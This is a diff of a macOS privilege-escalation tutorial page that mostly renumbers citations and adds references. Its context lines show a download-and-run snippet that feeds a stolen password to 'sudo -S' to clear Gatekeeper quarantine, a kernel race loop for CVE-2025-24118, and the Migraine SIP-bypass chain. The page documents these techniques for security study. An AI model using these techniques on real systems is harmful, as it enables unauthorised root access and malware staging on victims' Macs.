@@ -13,7 +13,7 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:
+Many privilege-escalation techniques that affect Linux or other Unix-like systems also apply to macOS. See:
 
 
 {{#ref}}
@@ -240,7 +240,7 @@ curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
 
-The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.
+The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.<sup>[[1]](#references)</sup>
 
 ## Newer macOS-specific vectors (2023–2025)
 
@@ -263,7 +263,7 @@ Combine with the **masquerading tricks above** to present a believable password 
 
 ### Privileged helper / XPC triage
 
-A lot of modern third-party macOS privescs follow the same pattern: a **root LaunchDaemon** exposes a **Mach/XPC service** from **`/Library/PrivilegedHelperTools`**, then the helper either **doesn't validate the client**, validates it **too late** (PID race), or exposes a **root method** that consumes a **user-controlled path/script**. This is the bug class behind many recent helper bugs in VPN clients, game launchers and updaters.<sup>[[4]](#references)</sup>
+A lot of modern third-party macOS privescs follow the same pattern: a **root LaunchDaemon** exposes a **Mach/XPC service** from **`/Library/PrivilegedHelperTools`**, then the helper either **doesn't validate the client**, validates it **too late** (PID race), or exposes a **root method** that consumes a **user-controlled path/script**. This is the bug class behind many recent helper bugs in VPN clients, game launchers and updaters.<sup>[[2]](#references)</sup>
 
 Quick triage checklist:
 
@@ -337,11 +337,11 @@ while (1) setgid(rand());
 while (1) getgid();
 ```
 
-Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.<sup>[[2]](#references)</sup>
+Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.<sup>[[4]](#references)</sup>
 
 ### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
 
-If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`).<sup>[[1]](#references)</sup> The chain:
+If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> The chain:
 
 1. Obtain root on a live system.
 2. Trigger `systemmigrationd` with crafted state to run an attacker-controlled binary.
@@ -349,7 +349,7 @@ If you already have root, SIP still blocks writes to system locations. The **Mig
 
 ### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
 
-Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.
+Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.<sup>[[6]](#references)</sup>
 
 ## TCC - Root Privilege Escalation
 
@@ -374,9 +374,11 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## References
 
-- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 - [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
 
 {{#include ../../banners/hacktricks-training.md}}
